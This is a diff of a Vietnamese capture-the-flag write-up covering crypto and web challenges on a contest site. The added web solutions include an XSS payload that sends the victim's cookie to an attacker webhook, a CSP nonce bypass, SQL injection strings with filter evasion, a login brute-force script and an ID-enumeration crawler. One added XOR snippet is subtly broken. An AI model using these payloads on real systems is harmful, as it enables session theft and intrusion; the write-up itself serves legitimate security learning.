@@ -36,7 +36,20 @@ key = ''
 for i in range(len(msg)):
     key += chr(ord(cipher[i]) ^ ord(msg[i]))
    
-print(key) # '*****'
+print(key) 
+# '*****'
+```
+
+Hmm, nhìn cái phần đầu của key này thì mình mạnh dạn đoán là chỉ cần xor với `ord('*')` là đủ, sửa lại phần code 1 chút thành.
+
+```python
+cipher = open('cipher.txt', 'r').read().strip()
+cipher = [chr(int(cipher[i:i+2], 16)) for i in range(0, len(cipher), 2)]
+msg = ''
+for i in range(len(msg)):
+    key += chr(ord(cipher[i]) ^ ord('*'))
+   
+print(msg)
 ```
 
 Thế là ra flag :D
@@ -77,13 +90,13 @@ cipher.txt
 NDY2QzYxNjc3QjVGNUY1RjQyNjE3MzY1MzYzNDc4NDg2NTc4NUY1RjVGN0Q=
 ```
 
-Rõ ràng là base64 rồi, decode ra được thế này
+Rõ ràng là base64 rồi, sau khi decode thì ra được thế này
 
 ```
 466C61677B5F5F5F426173653634784865785F5F5F7D
 ```
 
-Ban đầu mình đoán là base32 nhưng bị lỗi, xong mới thấy chữ cái toàn A-F ( ͡° ͜ʖ ͡°)
+Ban đầu mình đoán là base32 nhưng decode thử thì bị lỗi, xong sau đó mới thấy chữ cái toàn A-F ( ͡° ͜ʖ ͡°)
 
 Decode hex là xong
 
@@ -122,13 +135,11 @@ Với mã hóa AES thì độ dài key bằng độ dài iv, vậy nên iv_part2
 
 > Và đây là lúc bruh moment bắt đầu
 
-Dựa vào đề bài thì mình chỉ có ràng buộc duy nhất là `(16 - (38 % 16)) = 10` ký tự cuối của cái được decrypt phải có mã ASCII = 10, tức là kí tự xuống dòng. Nhưng đời không như mơ, có rất, rất nhiều flag được decrypt thỏa mãn ràng buộc đó. 
+Dựa vào đề bài thì mình thấy chỉ có ràng buộc duy nhất là `(16 - (38 % 16)) = 10` ký tự cuối của cái được decrypt phải có mã ASCII = 10, tức là kí tự xuống dòng. Nhưng đời không như mơ, có rất, rất nhiều flag được decrypt thỏa mãn ràng buộc đó. 
 
-Nhưng nhìn vào cấu trúc của những flag được tạo ra thì đa phần kí tự đang là hex, vậy nên mình thêm ràng buộc đó và số lượng giảm xuống còn 240. Nhưng thế này vẫn bruh quá. Sau đó mình thấy thêm nữa là iv_part1 chỉ toàn chữ cái in thường hoặc số nên mình giảm các kí tự được brute. 75 =))) Vẫn nhiều quá.
+Nhưng nhìn vào cấu trúc của những flag được tạo ra thì đa phần kí tự đang là hex, vậy nên mình thêm ràng buộc đó và số lượng giảm xuống còn 240. Nhưng thế này vẫn bruh quá. Sau đó mình thấy thêm nữa là `iv_part1` chỉ đang là hex, tuy nhiên, chữ cái đầu của `iv_part2` mình brute được chỉ có thể nằm trong `['p', 'q', 'x', 'y', 'z', '(', '*', '+', ',', '-', '/', '{', '|', '}', '~']`. Hmm, nghe vô lý phết.
 
-Tới lúc này thì mình để ý là kí tự đầu của part_2 chỉ có thể là p, q, x, y hoặc z, trong khi part_1 toàn là hex rồi thì còn cái nào hợp để bỏ vào đâu :/ *Vô lý*
-
-Trong lúc chán trường muốn bỏ cuộc, mình nghĩ có khi nào part_2 nó là `x0` hay không? Để nó đối xứng với phần đầu part_1? Tới nước này thì phải mò chứ sao giờ.
+Trong lúc chán trường muốn bỏ cuộc, mình nghĩ có khi nào `iv_part2` nó là `x0` hay không? Để nó đối xứng với phần đầu `iv_part1`? Tới nước này thì phải mò chứ sao giờ.
 
 > Ai ngờ nó lại đúng :D
 
@@ -163,7 +174,7 @@ def check_msg(msg):
     return True
 
 cnt = 0
-s = string.ascii_lowercase + string.digits
+s = string.printable
 
 for i in s:
     for j in s:
@@ -185,9 +196,43 @@ print(cnt)
 
 > Các cậu còn nhớ sự kiện Livestream lần đầu tiên của Hazy , có một số bạn đã nghịch ngợm làm bay màu cái Chatbox. Đố bạn cho bay màu chal12 này đấy.
 
+Ban đầu khi thấy cái tên bài là mình cũng đã bán tính bán nghi. Vì đa phần trong các bài web của ctf thì người chơi làm riêng lẻ, trong khi XSS chỉ gây hại ở client-side thay vì server-side, thế thì chơi kiểu gì nhỉ?
+
+Mình tin chắc đây là tung hỏa mù thôi, nó phải là SSTI hay gì đó thì mới làm được chứ. 30 phút... 1 tiếng trôi qua... Không 1 manh mối.
+
+Sau đó mình ngồi lại, đọc kĩ lại cái đề và cả những thứ trả về ở trang web xem mình bỏ sót cái gì không? 
+
+> Sót thật
+
+2 từ "receive" và "ticket" lúc mình nhập 1 cái gì đó xong là 1 cái hint to bự ám chỉ rằng có 1 con bot đang chờ mình nhập gì đó để nó sẽ đọc qua :v. Thế mình làm 1 cái payload đơn giản để redirect con bot sang 1 cái webhook mình tạo (Cái này nếu rành thì có thể setup bằng ngrok, heroku hoặc dùng những tool mì ăn liền như [webhook.site](https://webhook.site/) hay [hookbin.com](https://hookbin.com/) đều ok nha).
+
+```html
+<script>
+	window.location = "<webhook url>?cookie=" + document.cookie;
+</script>
+```
+
+Khi đó bạn để ý trên log của webhook sẽ có 2 truy vấn, 1 cái là của bạn và 1 cái của con bot (do lúc sau server hơi chậm nên có thể cái thứ 2 sẽ tới hơi lâu), đó sẽ là chỗ bạn lấy được cookie chứa flag :v
+
+`FLAG{10c802c9c6afc26769764b5b986d708a}`
+
 ### XSS Filter
 
 > Có vẻ như Chall12 là quá dễ với các bạn, thế còn lọc bớt một số kí tự thì sao :)
+
+Dùng payload cũ để nhập vào thì rõ ràng là chẳng có gì, mình check console thì nó báo lỗi CSP. Content Security Protocol hay CSP là 1 cách để bảo vệ trang web khỏi việc XSS (bạn có thể xem thêm ở [đây](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)). Hiện tại trong thẻ meta của trang web đang set CSP như sau:
+
+`default-src 'self'; script-src 'nonce-matuhn'...`
+
+Đúng ra với kiểu CSP là nonce thì giá trị phải được tạo random bởi server, vì nếu không nó chẳng khác gì unsafe-inline cả. Nói nôm na là chỉ cần thêm `nonce="matuhn"` là xong =)))
+
+```html
+<script nonce="matuhn">
+	window.location = "<webhook url>?cookie=" + document.cookie;
+</script>
+```
+
+`FLAG{5b7eca261028a4042fde4e3f45dec294}`
 
 ### Ét Quy Eo
 
@@ -195,19 +240,126 @@ print(cnt)
 >
 > Đây là phương thức tấn công yêu thích của Hacker khi lần đầu tiếp cận với website của bạn
 
+Trang web là 1 form đăng nhập, chỉ cần nhập username và password là xong. Thông thường mình sẽ thử truyền 1 đống SQLi payload vào password nhưng không ăn thua, kể cả payload lỗi syntax. Vậy nên mình tin là server chỉ query bằng username mà thôi. Và đúng thế thật, nhập username là `' or True --`, password thì tùy ý.
+
+`(1, 'lil uzi vert', 'is_admin', 'RmxhZ3tGcjMzX1N0eWwzfQ==')`
+
+Decode base64 sẽ ra được flag
+
+`Flag{Fr33_Styl3}`
+
 ### SQL Filter
+
+Thử ngay payload cũ thì rõ ràng là dính blacklist rồi ¯\\_(ツ)_/¯. Sau 1 hồi mò mẫm thì mình thấy là blacklist gồm có dấu cách (có thể thay thế bằng `/**/` hoặc `%09`), `or` (nhưng `oR` thì không). Tới đây thì mình sẽ có username là `'/**/oR/**/true/**/--`.
+
+Again, decode base64 sẽ ra được flag
+
+`Flag{Gr33t1nG}`
 
 ### Gatling gun
 
 > Với chiếc Gatling gun mạnh mẽ trong tay, Mèo Yang Hồ có thể vượt qua bất kì cánh cửa bảo mật nào. Nhưng thật buồn cười là trong tay hắn lại không có một viên đạn nào.Nếu bạn muốn nghịch súng với Mèo thì hãy đi nhặt đạn ở trong Github của Cookie Hân Hoan nhé.
 
+Bài này cũng chứa 1 login form khác nhưng nó yêu cầu 3 trường là username, password và ip. Inspect document cũng không có script để xử lý nên có vẻ nó không phải liên quan tới JS rồi.
+
+Nhưng sau đó thì mình nhớ ra trong repo của bài **Github** có chứa "đạn" thật :v Có 3 file `ip.txt`, `pa$$w0rd.txt`, `userLame.txt` và giờ mình chỉ cần thử từng tổ hợp của 3 trường này để tìm flag thôi :v
+
+*Tip là với những bài phải request để thử nhiều thì bạn có thể dùng google colab.*
+
+```python
+import requests
+
+user = open('userLame.txt', 'r').read().strip().split('\n')
+password = open('pa$$w0rd.txt', 'r').read().strip().split('\n')
+ip = open('ip.txt', 'r').read().strip().split('\n')
+
+for u in user:
+  for p in password:
+    for i in ip:
+      data = {"username": u, "password": p, "ip": i}
+      r = requests.post('http://chal9.web.letspentest.org/login', data=data)
+      print(u, p, i, r.text)
+```
+
+![](gatling_gun.png)
+
+`FLAG{e6c068faf9241fe9d1f2000516718377} `
+
 ### The maze runner
 
 > Lạc vào một mê cung với vô vàn những chuỗi kí tự bí ẩn. Vừa chạy vừa phải nghĩ đâu mới manh mối giúp Gà thoát ra.Hãy giúp Gà một tay nhé?
 
+Trang cho mình giao diện giống cây folder để mò vào từng folder tìm flag, khá giống giải mê cung rồi =))) nên lần này cứ viết thêm 1 cái script để tìm cũng được hoặc bạn có thể tìm tay :v
+
+```python
+import requests
+import re
+import base64
+
+base = 'http://chal10.web.letspentest.org/'
+
+def get_routes(path):
+    r = requests.get(path)
+    arr = [p.split('">')[1].split('</')[0] for p in re.findall('<a.*<\/a>', r.text)]
+    return arr
+
+def check(path):
+    r = requests.get(path)
+    if ('flag' in r.text.lower()) and ('fake' not in r.text.lower()):
+        print(r.text)
+        return True
+
+def get_content(path):
+    r = requests.get(path)
+    return r.text
+
+def run(cur, f):
+    print(cur)
+    f.write('=====\n' + cur + '\n')
+    f.write(get_content(base + cur))
+    routes = get_routes(base + cur)
+    if check(base + cur):
+        print(base + cur)
+        return True
+
+    for r in routes:
+        if r == '../':
+            continue
+        if run(cur + r, f):
+            return True
+
+with open('log', 'w') as f:
+    run('', f)
+```
+
+`FLAG{6059e2117ea3eeecdad7faf1e15d16a2}`
+
 ### ID'OR1=1
 
 > Một lỗ hổng rất cơ bản! Nhưng nếu nó xảy ra thì hậu quả rất khủng khiếp...
+
+Nhìn cái tên thì nghe có vẻ giống như một bài SQLi khác, mình sẽ nhập 1 cái id và trang sẽ trả về json data về thông tin cá nhân của người đó. Ban đầu mình thử 1 số trò SQLi cơ bản nhưng không được thì mình tính tới chuyện crawl hết đống data về xem chứa flag trong đó không. Kết quả: 200 id nhưng chẳng có gì.
+
+Nản quá nên mình lui ra kiếm bài khác làm, sau đó thì có cái hint của BTC là "Cuộc dạo chơi của những con số". Hmm, sao nghe giống BTC đang bảo mình brute thêm 1 lần nữa thế :D
+
+Thôi đã tới thì tới luôn vậy.
+
+```python
+import requests
+
+with open('log', 'w') as f:
+  for i in range(2000):
+    print(i)
+    r = requests.get('http://chal11.web.letspentest.org/user?id=' + str(i))
+    if 'invalid' not in r.text:
+      f.write('====\n' + str(i) + '\n' + r.text)
+      if i > 200:
+        print('Found one!')
+```
+
+Flag nằm ở id 1337, *nice*
+
+`Flag{61cb4a784e83b6109999af6f036b88bf}`
 
 ## Forensic
 
